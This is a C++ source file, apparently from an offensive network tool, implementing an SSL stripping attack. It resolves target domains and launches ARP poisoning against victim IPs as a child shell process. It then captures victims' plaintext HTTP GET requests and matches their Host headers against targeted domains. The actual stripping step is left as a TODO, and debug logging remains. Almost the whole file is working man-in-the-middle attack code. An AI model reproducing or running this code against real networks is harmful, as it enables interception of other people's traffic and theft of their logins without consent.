#include "ssl_stripping/silent.h"
#include "HttpLayer.h"
#include "IPv4Layer.h"
#include "IpAddress.h"
#include "Packet.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "TcpLayer.h"
#include "common/common.h"
#include "log.h"
#include "ssl_stripping/public.h"
#include <algorithm>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <boost/system/error_code.hpp>
#include <exception>
#include <future>
#include <sstream>
#include <stdexcept>
#include <unordered_set>
#include <vector>

#ifdef __linux__
#include <signal.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#endif

std::optional<std::unordered_set<std::string>>
resolveDomainToIP(const std::string &domain, const std::string &service) {
    std::unordered_set<std::string> outputIps;
    try {
        boost::asio::io_context ioc;

        boost::asio::ip::tcp::resolver resolver(ioc);

        // Resolve the endpoints against the domain name
        boost::system::error_code
            exc; // To capture errors without throwing exceptions immediately
        boost::asio::ip::tcp::resolver::results_type endpoints =
            resolver.resolve(domain, service, exc);

        if (exc) {
            LOG_ERROR("Boost.Asio resolve failed for " + domain +
                      ". Error message: " + exc.message());
            return std::nullopt; // Return empty list on error
        }

        // Iterate through the resolved endpoints and extract IP addresses
        for (const auto &entry : endpoints) {
            outputIps.insert(entry.endpoint().address().to_string());
        }

    } catch (const boost::system::system_error &e) {
        // Catch boost.asio specific exceptions
        LOG_ERROR("Boost.Asio System Exception during resolution for " +
                  domain + ". Error message: " + e.what() +
                  ". Error code: " + e.code().to_string());
    } catch (const std::exception &e) {
        // Catch other standard exceptions
        LOG_ERROR("Standard Exception during resolution for " + domain +
                  ". Error message: " + e.what());
    }
    return outputIps;
}

void connectWithServer(const std::string &domain) {
    try {
        const std::string HTTPS_PORT = "443";

        // Setup the asio and SSL context
        boost::asio::io_context ioc;
        boost::asio::ssl::context ssl_ctx(
            boost::asio::ssl::context::tlsv13_client);

        // Tell asio to use the default system certificate store
        ssl_ctx.set_default_verify_paths();

        // Create the SSL stream, wrapping a TCP socket
        boost::asio::ssl::stream<boost::asio::ip::tcp::socket> stream(ioc,
                                                                      ssl_ctx);

        // Tell the server which website you want to talk to.
        SSL_set_tlsext_host_name(stream.native_handle(), domain.c_str());

        // Resolve the hostname to an IP address
        boost::asio::ip::tcp::resolver resolver(ioc);
        auto endpoints = resolver.resolve(domain, HTTPS_PORT);

        // Connect the underlying TCP socket
        boost::asio::connect(stream.lowest_layer(), endpoints);

        // Perform the TLS Handshake
        stream.handshake(boost::asio::ssl::stream_base::client);

        LOG_INFO("Handshake successful!");

        // Send an HTTP GET request over the secure stream
        std::string request = "GET / HTTP/1.1\r\nHost: " + domain +
                              "\r\nConnection: close\r\n\r\n";
        boost::asio::write(stream, boost::asio::buffer(request));

        // Read the response
        boost::asio::streambuf response;
        boost::system::error_code exc;
        boost::asio::read(stream, response, exc);

        // Check for a clean close
        if (exc == boost::asio::error::eof) {
            LOG_INFO("Cleanly received response:");
            // Print the response headers and body
            LOG_INFO(&response);
        } else if (exc) {
            throw boost::system::system_error(exc);
        }

    } catch (std::exception &e) {
        std::cerr << "Exception: " << e.what() << std::endl;
    }
}

void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice * /*device*/,
    void * /*cookie*/) {
    pcpp::Packet parsedPacket(packet);

    // Check IPv4 layer
    auto *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    if (ipLayer == nullptr) {
        return;
    }

    // Check if destination IP matches some victim IP
    if (std::find(victimIps_.begin(), victimIps_.end(),
                  ipLayer->getDstIPAddress().toString()) == victimIps_.end()) {
        return;
    }
    LOG_INFO("FOUND PACKET1!");

    // Check TCP layer
    auto *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
    const int HTTP_PORT = 80;
    if ((tcpLayer == nullptr) || tcpLayer->getDstPort() != HTTP_PORT) {
        return;
    }
    LOG_INFO("FOUND PACKET2!");

    // Access HTTP Layer
    auto *httpRequestLayer =
        parsedPacket.getLayerOfType<pcpp::HttpRequestLayer>();
    if (httpRequestLayer == nullptr) {
        return;
    }
    LOG_INFO("FOUND PACKET3!");

    // Check if method is GET
    if (httpRequestLayer->getFirstLine()->getMethod() !=
        pcpp::HttpRequestLayer::HttpGET) {
        return;
    }
    LOG_INFO("FOUND PACKET4!");

    // Check Host header
    pcpp::HeaderField *hostField = httpRequestLayer->getFieldByName("Host");
    if (hostField == nullptr) {
        return;
    }
    LOG_INFO("FOUND PACKET5!");

    // Check whether domain is in Host header and start SSL attack if so
    std::string hostValue = hostField->getFieldValue();
    for (const std::string &domain : domainsToStrip_) {
        LOG_INFO("FOUND PACKET6!");
        if (hostValue.find(domain) != std::string::npos) {
            // TODO(Quinn)
            LOG_INFO("FOUND PACKET7!");
        }
    }
}

void ATK::SSL::SilentSslStrippingStrategy::execute() {
    if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
        // Initialize options with values based on this call
        std::string victimIpsCommaSeparated;
        for (const auto &victimIp : victimIps_) {
            victimIpsCommaSeparated += (victimIp.toString());
            victimIpsCommaSeparated += ',';
        };
        victimIpsCommaSeparated.pop_back();

        std::string ipsToSpoofCommaSeparated;

        // Get all target IPs from domain
        for (const std::string &domain : domainsToStrip_) {
            std::optional<std::unordered_set<std::string>> currentIps =
                resolveDomainToIP(domain, "https");
            if (currentIps.has_value()) {
                for (const auto &currentIp : currentIps.value()) {
                    ipsToSpoofCommaSeparated += currentIp;
                    ipsToSpoofCommaSeparated += ',';
                }
            }
        }
        ipsToSpoofCommaSeparated.pop_back();

        std::ostringstream command;
        command
            << "\"" << ATK::Common::getProcessName() << "\" --quiet --arp"
            << " \"" << device_->getName() << "\""
            << " \"\"" // Supply empty attackerMac to automatically derive it
            << " \"" << victimIpsCommaSeparated << "\""
            << " \"" << ipsToSpoofCommaSeparated << "\"";
        std::string cmd = command.str();

        LOG_INFO("got here!");
// Start ARP poison on different thread
#ifdef _WIN32
        HANDLE hJob = CreateJobObject(nullptr, nullptr);

        JOBOBJECT_EXTENDED_LIMIT_INFORMATION info = {};
        info.BasicLimitInformation.LimitFlags =
            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &info,
                                sizeof(info));

        STARTUPINFO sInfo = {sizeof(sInfo)};
        PROCESS_INFORMATION pInfo;

        CreateProcess(nullptr, cmd.data(), nullptr, nullptr, FALSE, 0, nullptr,
                      nullptr, &sInfo, &pInfo);

        // Link child to the job
        AssignProcessToJobObject(hJob, pInfo.hProcess);

        CloseHandle(pInfo.hProcess);
        CloseHandle(pInfo.hThread);
#else
        pid_t pid = fork();
        if (pid == 0) {
            // To make sure child kills itself when this process dies
            prctl(PR_SET_PDEATHSIG, SIGTERM);
            execl("/bin/sh", "sh", "-c", cmd.c_str(), nullptr);
            _exit(1);
        }
#endif
    } else {
        // TODO(Quinn) implement with DNS once it's available
    }

    if (!device_->open()) {
        throw std::runtime_error("Unable to open interface, no way right??");
    }

    std::promise<void> completionPromise;
    std::future<void> completionFuture = completionPromise.get_future();

    if (!device_->setFilter("tcp dst port 80")) {
        LOG_ERROR("Cannot set tcp filter");
        device_->close();
        throw std::runtime_error(
            "Unable to set http request filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();
        throw std::runtime_error("Unable to start capturing http packets");
    };

    try {
        completionFuture.get();
    } catch (const std::exception &e) {
        device_->close();
    }

    device_->close();
}
